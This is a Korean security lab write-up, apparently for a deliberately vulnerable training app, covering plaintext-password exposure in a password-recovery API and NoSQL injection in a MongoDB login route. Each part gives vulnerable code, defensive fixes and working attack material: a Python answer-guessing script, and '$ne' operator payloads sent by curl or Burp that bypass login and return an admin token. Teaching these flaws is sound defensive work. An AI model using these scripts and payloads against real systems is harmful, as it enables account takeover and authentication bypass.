# #05 Sensitive Data Exposure  ·  #06 NoSQL Injection

**OWASP** A02 Cryptographic Failures / A03 Injection  ·  **난이도** ⭐⭐ / ⭐⭐⭐

---

## #05 — Sensitive Data Exposure

### 취약점 원인

비밀번호 찾기 API가 보안 질문 답변이 맞으면 **비밀번호 원문을 응답에 포함해 반환**합니다.
보안 질문의 답변만 알면 계정을 탈취할 수 있습니다.

**`backend/routes/auth.js` — 97번째 줄**
```js
router.post('/find-password', async (req, res) => {
  const user = await User.findOne({ userId });
  if (user.securityAnswer !== securityAnswer) return res.status(400)...

  res.json({ message: 'Success', password: user.password }); // ❌ 비밀번호 원문 반환
});
```

보안 질문은 앱 전체에서 **"나의 보물 1호는?" 하나뿐**입니다.

---

### 공격 실습

**Step 1** — `https://localhost:55173/find-password` 접속

**Step 2** — 대상 아이디 입력, 답변 추측 시도 (`고양이`, `강아지`, `컴퓨터` 등)

**Step 3** — 답변이 맞으면 응답에 비밀번호가 그대로 출력

DevTools → Network → find-password 요청 → Response:
```json
{ "message": "Success", "password": "admin" }
```

**자동화 스크립트**
```python
import requests, urllib3
urllib3.disable_warnings()

url  = "https://192.168.1.20:5000/api/auth/find-password"
user = "admin"
answers = ["admin", "고양이", "강아지", "컴퓨터", "엄마"]

for ans in answers:
    r = requests.post(url, json={"userId": user, "securityAnswer": ans}, verify=False)
    if "password" in r.json():
        print(f"[+] 답변: '{ans}' → 비밀번호: {r.json()['password']}")
        break
    print(f"[-] '{ans}' 실패")
```

---

### 방어

```js
// 비밀번호를 반환하는 대신 임시 비밀번호 발급
const tempPassword = Math.random().toString(36).slice(-8);
user.password = await bcrypt.hash(tempPassword, 10);
await user.save();

res.json({ message: '임시 비밀번호가 발급되었습니다.', tempPassword });
// 실제 서비스라면 이메일로만 발송
```

---
---

## #06 — NoSQL Injection

### 취약점 원인

로그인 API가 `req.body`의 값을 **타입 검증 없이 MongoDB 쿼리에 직접 전달**합니다.
문자열 대신 MongoDB 연산자 객체를 전송하면 비밀번호 없이 인증을 통과할 수 있습니다.

**`backend/routes/auth.js` — 71번째 줄**
```js
// ❌ password가 객체여도 그대로 쿼리에 전달됨
const user = await User.findOne({ userId: userId, password: password });
```

---

### 공격 원리

일반 로그인 요청:
```json
{ "userId": "admin", "password": "admin" }
```
MongoDB 쿼리: `{ userId: "admin", password: "admin" }` → 정확한 일치 검색

NoSQL Injection 요청:
```json
{ "userId": "admin", "password": { "$ne": "" } }
```
MongoDB 쿼리: `{ userId: "admin", password: { $ne: "" } }` → **비밀번호가 빈 문자열이 아닌** 모든 admin → 인증 우회!

---

### 공격 실습

**방법 1 — curl**
```bash
curl -k -X POST https://192.168.1.20:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"userId": "admin", "password": {"$ne": ""}}'
```

```json
{ "token": "eyJhbGciOiJIUzI1NiIs...", "role": "Admin", "userId": "admin" }
```

비밀번호를 모르는 상태에서 **admin JWT 획득** 성공.

**방법 2 — Burp Suite Repeater**
1. 로그인 요청 캡처 → Repeater로 전송
2. Body 수정:
```json
{ "userId": "admin", "password": {"$ne": ""} }
```
3. Send → 200 OK + 토큰 수신 확인

**심화 — 아이디도 모를 때**
```json
{ "userId": {"$ne": ""}, "password": {"$ne": ""} }
```
DB의 첫 번째 사용자로 로그인됩니다.

---

### 방어

**방법 1 — `express-mongo-sanitize` 미들웨어 (`server.js`)**
```js
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // $, . 포함된 키 자동 제거
```

**방법 2 — 타입 검증 (`auth.js`)**
```js
const { userId, password } = req.body;

if (typeof userId !== 'string' || typeof password !== 'string') {
  return res.status(400).json({ message: 'Invalid input' });
}

// userId로만 조회 후 비밀번호 별도 비교
const user = await User.findOne({ userId });
if (!user || !(await bcrypt.compare(password, user.password))) {
  return res.status(400).json({ message: 'Invalid credentials' });
}
```
